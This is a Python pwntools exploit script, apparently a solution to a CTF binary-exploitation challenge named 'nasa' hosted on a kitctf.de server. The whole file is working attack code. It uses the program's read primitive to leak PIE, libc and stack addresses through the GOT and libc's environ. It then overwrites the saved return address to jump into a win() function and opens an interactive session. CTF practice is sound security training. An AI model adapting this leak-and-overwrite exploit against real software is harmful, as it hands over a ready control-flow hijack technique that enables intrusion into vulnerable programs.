#!/usr/bin/env python3

from pwn import *

exe = ELF("./nasa")
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', False)
context.binary = exe
gdb_script = '''
    b *main+628
    b *main+889
    b *main+870
    c
'''
#context.log_level = "debug"
def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("ironford-of-everlasting-prosperity.gpn23.ctf.kitctf.de", "443", ssl=True)

    return r


def main():
    r = conn()

    stack_leak = int(r.recvline().strip(), 16)
    win_leak   = int(r.recvline().strip(), 16)
    libc_system_offset =  0x53110 if args.LOCAL else 0x58750
    libc_environ_offset = 0x1eee28 if args.LOCAL else 0x20ad58

    log.info(f"stack @ option = {hex(stack_leak)}")
    log.info(f"win()          = {hex(win_leak)}")

    pie_base = win_leak - exe.sym.win
    system_got = pie_base + exe.got.system
    log.info(f"system@got     = {hex(system_got)}")

    r.sendlineafter(b"Exit\n", b"2")
    r.sendlineafter(b"(hex)\n", hex(system_got).encode())

    system_libc_leak = int(r.recvline().strip(), 16)

    libc_base = system_libc_leak - libc_system_offset

    log.info(f"libc base     = {hex(libc_base)}")
    libc.address = libc_base

    environ_addr = libc.address + libc_environ_offset
    log.info(f"environ addr: {hex(environ_addr)}")

    r.sendlineafter(b"Exit\n", b"2")
    r.sendlineafter(b"(hex)\n", hex(environ_addr).encode())

    stack_leak = int(r.recvline().strip(), 16)
    saved_rip = stack_leak - 304 # 288 in local, 304 in remote
    
    log.info(f"stack addr: {hex(stack_leak)}")
    log.info(f"saved rip addr: {hex(saved_rip)}")

    r.sendlineafter(b"Exit\n", b"1")
    r.sendlineafter(b"(hex)\n", f"{hex(saved_rip)} {hex(win_leak + 22)}".encode())

    r.sendlineafter(b"Exit\n", b"3")

    r.interactive()


if __name__ == "__main__":
    main()
